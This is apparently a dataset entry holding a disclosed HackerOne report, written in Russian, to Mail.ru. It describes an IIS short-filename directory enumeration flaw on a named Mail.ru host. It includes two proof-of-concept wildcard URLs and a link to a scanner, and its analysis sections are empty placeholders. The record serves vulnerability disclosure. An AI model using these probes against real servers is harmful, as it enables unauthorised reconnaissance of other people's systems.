---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '15652'
original_report_id: '15652'
title: Перечисление каталогов за счёт уязвимости в IIS
weakness: Information Disclosure
team_handle: mailru
created_at: '2014-06-08T18:52:41.166Z'
disclosed_at: '2015-06-28T21:14:09.171Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- information-disclosure
---

# Перечисление каталогов за счёт уязвимости в IIS

## Metadata

- HackerOne Report ID: 15652
- Weakness: Information Disclosure
- Program: mailru
- Disclosed At: 2015-06-28T21:14:09.171Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Приветствую!

Сервер с багой : game1.bb.mail.ru

Можно попытаться перебирать каталоги за счёт уязвимости в IIS.

PoC

game1.bb.mail.ru/images/*~1*/a.aspx?aspxerrorpath=/
game1.bb.mail.ru/images/*~2*/a.aspx?aspxerrorpath=/

Можно запустить сканнер и пофаззить эту багу более конкретно

http://code.google.com/p/iis-shortname-scanner-poc/

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
